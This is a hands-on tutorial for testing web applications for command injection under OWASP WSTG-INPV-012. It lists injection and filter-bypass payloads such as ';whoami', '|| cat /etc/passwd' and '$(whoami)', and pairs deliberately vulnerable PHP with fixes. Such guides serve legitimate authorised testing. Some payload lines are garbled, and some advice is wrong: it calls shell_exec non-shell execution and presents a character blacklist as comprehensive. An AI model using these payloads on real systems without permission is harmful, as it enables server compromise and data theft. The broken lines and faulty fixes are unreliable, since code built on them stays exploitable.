# Testing for Command Injection Vulnerabilities

## Overview

Testing for Command Injection vulnerabilities involves verifying that a web application properly sanitizes user input used in system commands to prevent attackers from executing arbitrary commands on the server. According to OWASP (WSTG-INPV-012), Command Injection occurs when untrusted input is incorporated into system commands without validation, enabling attackers to run malicious commands, access sensitive data, or compromise the server. This guide provides a hands-on methodology to test for Command Injection vulnerabilities, focusing on input vectors, basic command injection, blind command injection, filter bypass, and time-based injection, with tools, commands, payloads, and remediation strategies.

**Impact**: Command Injection vulnerabilities can lead to:
- Arbitrary command execution (e.g., running `whoami` or `rm -rf`).
- Unauthorized access to server files or resources.
- Privilege escalation or full server compromise.
- Data leakage or manipulation.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

**Ethical Note**: Obtain explicit permission before testing, as command injection attempts may execute harmful commands, access restricted data, or disrupt server operations.

## Testing Tools

The following tools are recommended for testing Command Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject command payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check responses for command output or errors.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with command injection rules; manually verify findings due to false positives.

- **cURL and HTTPie**: Send HTTP requests with command injection payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/ping?ip=127.0.1.1;whoami"
      # HTTPie
      http "http://example.com/ping?ip==127.0.0.1;whoami"
      ```

- **Netcat (nc)**: Tests server responses for command execution.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "GET /ping?ip=127.0.0.1;whoami HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

- **Postman**: GUI tool for testing command injection in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to command payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for command output.
  - **Note**: Firefox’s 2025 network analysis improvements enhance response inspection.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-012, testing Command Injection vulnerabilities across input vectors, basic command injection, blind command injection, filter bypass, and time-based injection.

### Common Command Injection Payloads

Below is a list of common Command Injection payloads to test various system command vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution in controlled environments to avoid unintended server impact.

- **Basic Command Injection Payloads**:
  - `;whoami` (Executes `whoami`)
  - `|id` (Pipes to `id` command)
  - `&& uname -a` (Chains with `uname`)
  - `|| cat /etc/passwd` (Runs if previous fails)

- **Blind Command Injection Payloads**:
  - `;sleep 5` (Delays response for  - `5` ping seconds)
  - `|ping -c 5 127.0.0.1` (Sends 5 pings)
  - `&& echo test > /tmp/test.txt` (Writes to file)

- **Filter Bypass Payloads**:
  - `%3bwhoami` (URL-encoded semicolon)
  - `${whoami}` (Variable substitution)
  - `\who\ami` (Backslash-separated)
  - `$(whoami)` (Command substitution)

- **Command Chaining Payloads**:
  - `;ls;pwd` (Multiple commands)
  - `&&whoami&&id` (Conditional chaining)
  - `|cat /etc/passwd|grep root` (Piped commands)

- **Time-Based Payloads**:
  - `;sleep 10` (Delays 10 seconds)
  - `&& ping -c 5 127.0.0.1` (Delays ~5 seconds)
  - `|timeout 5s sleep  (Timeout after 10` seconds)

**Note**: Payloads depend on the operating system (Linux, Windows) and command execution context (e.g., `system()`, `exec()`). Test payloads in URL parameters, form fields, or POST data where commands are likely used. For Windows, use payloads like `&whoami`, `|dir`, or `&& ping -n 5 127.0.0.1`.

### 1. Identify Input Vectors

**Objective**: Locate user-controllable inputs that may be used in system commands.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, URLs, or APIs that may execute system commands (e.g., ping tools, file downloads, system utilities).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `ip=127.0.0.1`, `cmd=ping`).
3. Inspect responses:
   - Check for command output (e.g., `ping` results) or errors (e.g., `sh: 1: invalid command`).
   - Use Developer Tools (`Ctrl+Shift+I`) to search for command-related output.
4. List input vectors:
   - Document query parameters (e.g., `GET /ping?ip=127.0.0.1`), form fields, headers, and POST data payloads.

**Example Input Vectors**:
- URL: `http://example.com/ping?ip=127.0.0.1`
- Form: `<input name="host">`
- API: `POST /api/execute?cmd=ping`

**Remediation**:
- Validate inputs with allowlists:
  ```php
  if (!preg_match('/^[a-zA-Z0-9.-]+$/', $_GET['ip'])) die("Invalid input");
  ```
- Escape special characters:
  ```php
  $ip = escapeshellarg($_GET['ip']);
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for Basic Command Injection

**Objective**: Verify if user input can execute arbitrary system commands.

**Steps**:
1. Identify command-related inputs:
   - Look for parameters like `?ip=127.0.0.1` in ping or system tools.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     GET /ping?ip=127.0.0.1;whoami HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/ping?ip=127.0.0.1;whoami"
     ```
3. Check responses:
   - Look for command output (e.g., `www-data`) or errors.
   - Test: `|id`, `&& uname -a`.
4. Test Windows-specific payloads:
   - Try: `&whoami`, `|dir`.

**Example Vulnerable Code (PHP)**:
```php
$ip = $_GET['ip'];
system("ping -c 4 $ip");
```
Test: `?ip=127.0.0.1;whoami`
Result: Outputs `whoami` result.

**Example Secure Code (PHP)**:
```php
$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
if (!$ip) die("Invalid IP");
system("ping -c 4 " . escapeshellarg($ip));
```
Test: No execution.

**Remediation**:
- Use safe APIs:
  ```php
  $ip = escapeshellarg($ip);
  system("ping -c 4 $ip");
  ```
- Avoid direct command execution:
  ```php
  // Use libraries instead of system()
  ```

**Tip**: Save command output in a report.

### 3. Test for Blind Command Injection

**Objective**: Detect command injection when no output is returned.

**Steps**:
1. Inject blind payloads:
   - Test: `?ip=127.0.0.1;sleep 5`
   - Use Burp:
     ```http
     GET /ping?ip=127.0.0.1;sleep 5 HTTP/1.1
     Host: example.com
     ```
2. Measure response time:
   - Look for delays (e.g., 5 seconds for `sleep 5`).
   - Compare with `?ip=127.0.0.1` (no delay).
3. Test file creation:
   - Try: `&& echo test > /tmp/test.txt`.
   - Verify via other vulnerabilities (e.g., LFI).
4. Use Burp Intruder:
   - Test multiple payloads (e.g., `sleep 1`, `sleep 2`).

**Example Vulnerable Code (PHP)**:
```php
$ip = $_GET['ip'];
system("ping -c 4 $ip > /dev/null");
```
Test: `?ip=127.0.0.1;sleep 5`
Result: 5-second delay.

**Example Secure Code (PHP)**:
```php
$ip = preg_replace('/[^0-9.]/', '', $ip);
system("ping -c 4 " . escapeshellarg($ip) . " > /dev/null");
```
Test: No delay.

**Remediation**:
- Sanitize inputs:
  ```php
  $ip = filter_var($ip, FILTER_VALIDATE_IP);
  ```
- Use non-shell execution:
  ```php
  $result = shell_exec("ping -c 4 " . escapeshellarg($ip));
  ```

**Tip**: Save response time differences in a report.

### 4. Test for Filter Bypass

**Objective**: Verify if command input filters can be bypassed.

**Steps**:
1. Inject bypass payloads:
   - Test: `?ip=127.0.0.1%3bwhoami`
   - Use cURL:
     ```bash
     curl -i "http://example.com/ping?ip=127.0.0.1%3bwhoami"
     ```
2. Check responses:
   - Look for command execution or errors.
   - Test: `${whoami}`, `$(whoami)`, `\who\ami`.
3. Test obfuscation:
   - Try: `;w'h'o'a'm'i`.
4. Use Netcat to confirm:
   ```bash
   echo -e "GET /ping?ip=127.0.0.1%3bwhoami HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
   ```

**Example Vulnerable Code (PHP)**:
```php
$ip = str_replace(";", "", $_GET['ip']);
system("ping -c 4 $ip");
```
Test: `?ip=127.0.0.1%3bwhoami`
Result: Executes `whoami`.

**Example Secure Code (PHP)**:
```php
$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
if (!$ip) die("Invalid IP");
system("ping -c 4 " . escapeshellarg($ip));
```
Test: No execution.

**Remediation**:
- Use comprehensive filters:
  ```php
  if (preg_match('/[;|&$]/', $ip)) die("Invalid input");
  ```
- Decode inputs before validation:
  ```php
  $ip = urldecode($ip);
  ```

**Tip**: Save bypass payloads and responses in a report.

### 5. Test for Time-Based Command Injection

**Objective**: Confirm command injection using timing differences.

**Steps**:
1. Inject time-based payloads:
   - Test: `?ip=127.0.0.1;sleep 10`
   - Use Burp:
     ```http
     GET /ping?ip=127.0.0.1;sleep 10 HTTP/1.1
     Host: example.com
     ```
2. Measure response time:
   - Look for a 10-second delay.
   - Compare with `?ip=127.0.0.1`.
3. Test alternative delays:
   - Try: `&& ping -c 5 127.0.0.1` (Linux) or `& ping -n 5 127.0.0.1` (Windows).
4. Automate with Burp Intruder:
   - Test delays (e.g., `sleep 5`, `sleep 10`).

**Example Vulnerable Code (PHP)**:
```php
$ip = $_GET['ip'];
exec("ping -c 4 $ip");
```
Test: `?ip=127.0.0.1;sleep 10`
Result: 10-second delay.

**Example Secure Code (PHP)**:
```php
$ip = preg_replace('/[^0-9.]/', '', $ip);
exec("ping -c 4 " . escapeshellarg($ip));
```
Test: No delay.

**Remediation**:
- Restrict command execution:
  ```php
  $ip = escapeshellarg($ip);
  ```
- Use safe libraries:
  ```php
  // Avoid exec(), use specific APIs
  ```

**Tip**: Save timing evidence in a report.